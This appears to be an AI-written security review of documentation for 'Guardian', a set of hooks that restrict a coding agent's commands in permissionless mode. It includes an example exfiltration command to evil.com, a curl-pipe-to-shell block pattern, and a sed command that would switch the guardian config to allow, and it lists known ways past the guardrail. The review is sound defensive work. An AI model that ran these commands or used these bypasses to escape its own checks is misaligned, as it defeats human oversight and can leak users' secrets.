# Security Perspective Review -- Task #10

**Reviewer**: v2-security-perspective
**Date**: 2026-02-16
**Scope**: README.md, CLAUDE.md, KNOWN-ISSUES.md, all implementation files
**Method**: Full documentation read + implementation cross-reference for every security claim

---

## Security Documentation Checklist

### 1. Threat Model
**PASS**

The threat model is clearly stated in README.md under "Security Model":
- "What Guardian protects against" (9 items) and "What Guardian does NOT protect against" (6 items) clearly delineate scope.
- The README intro makes clear this is about protecting against the AI agent's actions in permissionless mode, not against external attackers.
- The "Why Guardian" section frames the problem correctly: `--dangerously-skip-permissions` is all-or-nothing.

**Verified against implementation**: The threat model accurately reflects what the code does. The 4 PreToolUse hooks intercept agent tool calls; the Stop hook creates checkpoints. This aligns with the documented scope.

### 2. Fail-Closed Behavior
**PASS**

Documented in:
- README Architecture table: "Fail-closed (deny on error)" for all 4 security hooks
- README Design Principles: "Fail-closed: All security hooks deny on error or timeout"
- CLAUDE.md Security Invariants: "Fail-closed end-to-end"
- README hookBehavior section: Default values `"deny"` for both onTimeout and onError

**Verified against implementation**:
- `bash_guardian.py:1263-1289`: Catches unhandled exceptions, calls `get_hook_behavior().get("onError", "deny")` with deny as hardcoded default. Double-fallback to raw deny_response if hookBehavior lookup itself fails.
- `edit_guardian.py:61-86`, `read_guardian.py:57-82`, `write_guardian.py:61-86`: Same pattern -- outer try/except with hookBehavior fallback, inner try/except with hardcoded deny.
- `_guardian_utils.py:630-650`: `make_hook_behavior_response()` defaults to deny for unrecognized action strings.
- Import failures (lines 37-50 in thin wrappers) emit deny JSON directly -- fail-closed even before utils load.

All confirmed correct.

### 3. Fail-Open Exceptions
**PASS**

Documented in:
- README Architecture table: "Fail-open (never blocks exit)" for Auto-Commit
- README Auto-Commit section: "fail-open by design -- a commit failure must never block session termination"
- CLAUDE.md: "Auto-commit is fail-open by design"

**Verified against implementation**:
- `auto_commit.py:40-42`: ImportError handler exits with `sys.exit(0)` (no denial)
- `auto_commit.py:163-173`: Top-level exception handler logs but exits 0
- `_guardian_utils.py:1583-1598`: `git_has_changes()` returns False on error (fail-open)

Correctly documented and justified. The justification ("commit failure must never block session termination") is sound.

### 4. Known Gaps
**PASS (with minor note)**

All three known security gaps from CLAUDE.md are disclosed:
1. **Auto-commit --no-verify**: Documented in CLAUDE.md (line 36), README Security Warning for includeUntracked (line 325), and referenced in KNOWN-ISSUES.md.
2. **Limited test coverage**: Documented in both CLAUDE.md and README Testing section.
3. **Normalization helpers fail-open**: Documented in CLAUDE.md (line 38).

**Verified against implementation**:
- `auto_commit.py:146`: `git_commit(message, no_verify=True)` -- confirmed unconditional --no-verify.
- `_guardian_utils.py:948-951`: `normalize_path()` returns original path on exception (fail-open). Comment says "fail-open" explicitly.
- `_guardian_utils.py:1187-1189`: `match_path_pattern()` has `default_on_error` parameter, correctly used as `True` for deny-list checks in `match_zero_access()`, `match_read_only()`, `match_no_delete()`.

**Minor note**: The normalization fail-open gap is partially mitigated by `match_path_pattern(default_on_error=True)` for deny-list checks. This defense-in-depth is documented in CLAUDE.md but could be more explicitly called out in README.

### 5. Bypass Risks
**PASS**

Documented bypass vectors:
- ANSI-C quoting (`$'...'`) -- README "What Guardian does NOT protect against"
- TOCTOU race conditions for symlink checks -- README "What Guardian does NOT protect against"
- Interpreter scripts (arbitrary code patterns) -- README "What Guardian does NOT protect against"
- Padding attacks (>100KB) -- README Layer 0 description and "What It Catches"
- Command chaining (`;`, `&&`, `||`, `|`, `&`, newlines) -- addressed by Layer 2 decomposition, documented in README
- Shell escapes in path scan -- README Layer 1 description (word-boundary matching)

**Verified against implementation**:
- `bash_guardian.py:99`: Comment explicitly states "Known limitation: ANSI-C quoting ($'...') is not specially handled."
- `bash_guardian.py:82-245`: `split_commands()` handles `;`, `&&`, `||`, `|`, `&`, `\n` with quote/nesting awareness.
- `_guardian_utils.py:855-861`: Commands >100KB blocked unconditionally.

**One gap**: The README does not explicitly mention that `bash_guardian.py` does NOT intercept commands run via `subprocess.Popen` or similar within an already-allowed script. This is implicitly covered by "Arbitrary code within interpreter scripts" but could be more explicit.

### 6. Not a Sandbox
**PASS**

Documented in:
- README Security Model closing line: "Use Guardian alongside git backups, CI/CD checks, and standard access controls -- not instead of them."
- README Design Principles: "Defense in depth: Multiple independent checks catch overlapping threat vectors."
- README "What Guardian does NOT protect against": Lists 6 categories of threats outside scope.

The documentation avoids claiming Guardian is a sandbox. The README framing ("guardrails", "safety checkpoints", "defense-in-depth") is appropriately modest.

### 7. Auto-commit Risks
**PASS**

Documented in:
- README includeUntracked security warning (line 325): Explicitly warns about `--no-verify` + `includeUntracked: true` combination.
- CLAUDE.md Known Security Gaps #1: "auto_commit.py:146 unconditionally bypasses pre-commit hooks"
- README Auto-Commit section: Lists all skip conditions.

**Verified against implementation**:
- `auto_commit.py:146`: Confirmed `no_verify=True` is unconditional and cannot be configured.
- `auto_commit.py:103-104`: `includeUntracked` defaults to `false` in code and config.

The documentation correctly flags this as the #1 security gap. The default configuration (`includeUntracked: false`) mitigates the highest-risk scenario.

### 8. Path Normalization
**PASS (adequate)**

Documented in:
- CLAUDE.md Known Security Gaps #3: "Normalization helpers fail-open"
- README Security Model: "Path traversal attacks (../ normalized via Path.resolve(strict=False))"
- KNOWN-ISSUES.md COMPAT-06: Documents the fix for CWD-based resolution
- KNOWN-ISSUES.md COMPAT-07: Documents macOS case sensitivity fix

**Verified against implementation**:
- `_guardian_utils.py:918-951`: `normalize_path()` does expanduser + abspath + normpath, returns original on error.
- `_guardian_utils.py:954-971`: `expand_path()` does expanduser + resolve.
- `_guardian_utils.py:1059-1084`: `normalize_path_for_matching()` calls expand_path + forward-slash normalization.
- `bash_guardian.py:571-591`: `_is_within_project_or_would_be()` uses `Path.resolve(strict=False)` for traversal prevention.

The defense-in-depth approach (multiple independent checks) compensates for individual normalization failures. This is adequately documented.

### 9. Network Access
**PASS**

Documented in:
- README "What It Catches" Hard blocks: "Remote script execution (curl ... | bash)"
- Default config block pattern (line 49-50): `(?:curl|wget)[^|]*\\|\\s*(?:bash|sh|zsh|python|perl|ruby|node)`

**Verified against implementation**: The pattern blocks piping remote content to interpreters. Guardian does NOT block `curl` or `wget` by themselves (allowing legitimate API calls, package downloads, etc.). This is a reasonable tradeoff documented implicitly by only listing the pipe-to-interpreter pattern.

**Note**: Guardian does not block outbound network access itself (e.g., `curl -X POST https://evil.com/exfil -d @secrets.json`). This is covered under "Arbitrary code within interpreter scripts" but is a distinct vector. Users who need strict network control should add custom patterns. This is not a documentation deficiency per se -- it's a scope limitation that is adequately bounded by the threat model.

### 10. Configuration Risks
**PASS (with recommendation)**

Documented warnings:
- `includeUntracked: true` security warning (README line 325)
- `hookBehavior` values documented with `deny` defaults (README hookBehavior table)
- `noDeletePaths` limitation documented (README line 270: Edit tool can still modify)
- Deprecated `allowedExternalPaths` key documented (README Upgrading section)
- Config validation warns but does not block (KNOWN-ISSUES.md)

**Verified against implementation**:
- `_guardian_utils.py:614-627`: `get_hook_behavior()` hardcodes deny defaults.
- `_guardian_utils.py:653-743`: `validate_guardian_config()` checks required sections, validates patterns, warns on deprecated keys.

**FINDING -- MEDIUM RISK**: Setting `hookBehavior.onError: "allow"` would cause all security hooks to pass-through on crash instead of blocking. The documentation lists "allow" as a valid value (README hookBehavior table) but does not explicitly warn that this setting eliminates fail-closed behavior. This is the most dangerous misconfiguration a user could make.

**Recommendation**: Add a security warning to the hookBehavior documentation:
> **Security warning**: Setting `onError` or `onTimeout` to `"allow"` disables fail-closed behavior. If a hook crashes or times out, operations will be silently permitted. Only use `"allow"` for debugging purposes, never in production.

### 11. Privilege Escalation
**PASS (partial)**

The README does not explicitly document sudo/su/doas blocking because the default config does not include patterns for these. However:
- The default block patterns focus on destructive commands, not privilege escalation.
- Guardian operates at the command string level; if Claude runs `sudo rm -rf /`, the `rm -rf /` pattern would still match inside the sudo prefix.

**Verified against implementation**:
- `bash_guardian.py:82-245`: `split_commands()` does not strip sudo prefixes.
- `_guardian_utils.py:839-874`: `match_block_patterns()` applies regex across the full command string, so `sudo rm -rf /` would still match `rm\s+-[rRf]+\s+/`.
- However, `sudo cat .env` would NOT trigger Layer 1 path scan's word-boundary matching if the `cat` command itself is not in the scan. But `cat .env` would be caught by the Read guardian if Claude uses the Read tool, and `.env` would be caught by Layer 1's path scan if `.env` appears in the bash command string.

**Gap**: `sudo` itself is not blocked. A command like `sudo chown root:root .` or `sudo chmod 777 /etc/passwd` would not be caught by default patterns. This is a scope limitation rather than a documentation error, but it could be worth noting in "Customizing Command Patterns" as a suggested addition for security-conscious users.

### 12. Shell Escape
**PASS**

Documented in:
- README Layer 2 description: "Split compound commands (;, &&, ||, |, &, newlines)"
- README Design Principles: "Defense in depth: Multiple independent checks"
- README "What Guardian does NOT protect against": ANSI-C quoting

**Verified against implementation**:
- `bash_guardian.py:82-245`: `split_commands()` handles all major shell separators with proper quote awareness (single, double, backtick, `$()`, `<()`, `>()`).
- `bash_guardian.py:99`: Explicitly documents ANSI-C quoting as a known limitation.
- Layer 0 (block patterns) runs against the full unsplit command, providing a safety net before decomposition.
- Layer 1 (path scan) also runs against the full unsplit command.

The dual approach (full-command scan + decomposed analysis) is a strong defense-in-depth pattern.

---

## Additional Security Findings

### FINDING-1: hookBehavior.onError="allow" is a dangerous misconfiguration (MEDIUM)
**Status**: Not documented as a risk
**Location**: README.md hookBehavior table; all 4 security hook error handlers
**Issue**: Users can set `hookBehavior.onError` to `"allow"`, which causes all security hooks to silently pass-through on crash. The validate_guardian_config function warns about invalid values but accepts `"allow"` as valid.
**Risk**: A single crash (e.g., malformed input, Python exception) would bypass all security checks.
**Recommendation**: Add explicit security warning in README hookBehavior section.

### FINDING-2: Pre-commit --no-verify used in both auto_commit AND bash_guardian (LOW)
**Status**: Partially documented
**Location**: `bash_guardian.py:1209`, `auto_commit.py:146`
**Issue**: Both auto_commit.py (Stop hook) and bash_guardian.py (pre-danger checkpoint) use `--no-verify`. CLAUDE.md documents this for auto_commit.py but the bash_guardian pre-commit checkpoint is not specifically called out.
**Risk**: Pre-danger checkpoints also bypass pre-commit hooks.
**Recommendation**: CLAUDE.md should note that --no-verify is used in both contexts, or the README pre-danger checkpoint section should mention it.

### FINDING-3: Self-guarding only protects against Read/Edit/Write tools, not Bash (LOW)
**Status**: Not explicitly documented
**Location**: `_guardian_utils.py:2162-2217` (is_self_guardian_path), `bash_guardian.py` (no self-guardian check)
**Issue**: Self-guarding blocks Read/Edit/Write tool access to `.claude/guardian/config.json`, but does not check for bash commands that could modify the file (e.g., `sed -i 's/deny/allow/' .claude/guardian/config.json`). However, `.claude` IS in the default block patterns for deletion, and the bash guardian's path extraction + read-only checks would catch many indirect modifications.
**Risk**: Low -- bash commands modifying config would need to be specifically crafted and would be caught by Layer 1 path scan if `.claude` appears in the command. The `.claude` directory deletion pattern provides additional coverage.
**Note**: This is a defense-in-depth gap, not a critical vulnerability. Worth documenting for completeness.

### FINDING-4: Dry-run mode is an environment variable anyone can set (INFO)
**Status**: Documented in README
**Location**: `_guardian_utils.py:751-764`
**Issue**: `CLAUDE_HOOK_DRY_RUN=1` disables all enforcement. This is only settable at session launch, not by the AI agent within a session, so it requires human action.
**Risk**: Minimal -- the threat model is about AI agent actions, not human attacker actions. Documented correctly.

### FINDING-5: Config cache means runtime config changes are not picked up (INFO)
**Status**: Documented implicitly
**Location**: `_guardian_utils.py:492-494` (cache check in load_guardian_config)
**Issue**: Config is cached per-process. If a user changes config.json mid-session, the hooks continue using the old config until the next tool call (new process).
**Risk**: None -- this is a reasonable design. Each hook invocation creates a new process.

---

## Summary

| # | Checklist Item | Verdict | Notes |
|---|---------------|---------|-------|
| 1 | Threat Model | **PASS** | Clearly stated with explicit scope boundaries |
| 2 | Fail-Closed Behavior | **PASS** | Documented and verified in all 4 security hooks |
| 3 | Fail-Open Exceptions | **PASS** | Auto-commit fail-open documented and justified |
| 4 | Known Gaps | **PASS** | All 3 gaps from CLAUDE.md are disclosed |
| 5 | Bypass Risks | **PASS** | ANSI-C quoting, TOCTOU, interpreter scripts documented |
| 6 | Not a Sandbox | **PASS** | Appropriately framed as defense-in-depth |
| 7 | Auto-commit Risks | **PASS** | --no-verify risk clearly documented |
| 8 | Path Normalization | **PASS** | Limitations documented, defense-in-depth mitigates |
| 9 | Network Access | **PASS** | Pipe-to-interpreter blocked; scope limitation bounded |
| 10 | Configuration Risks | **PASS** | With recommendation to add onError=allow warning |
| 11 | Privilege Escalation | **PASS** | Patterns match through sudo; no explicit sudo block noted |
| 12 | Shell Escape | **PASS** | Comprehensive handling with known ANSI-C limitation |

**Overall Security Documentation Grade: PASS**

The documentation is thorough, honest about limitations, and verified accurate against implementation. The security model is clearly bounded. The three known gaps are responsibly disclosed with appropriate severity ratings.

**Recommended Additions** (non-blocking):
1. Add security warning for `hookBehavior.onError: "allow"` misconfiguration (FINDING-1, MEDIUM)
2. Note that pre-danger checkpoints also use --no-verify (FINDING-2, LOW)
3. Consider documenting that self-guarding covers Read/Edit/Write tools only (FINDING-3, LOW)
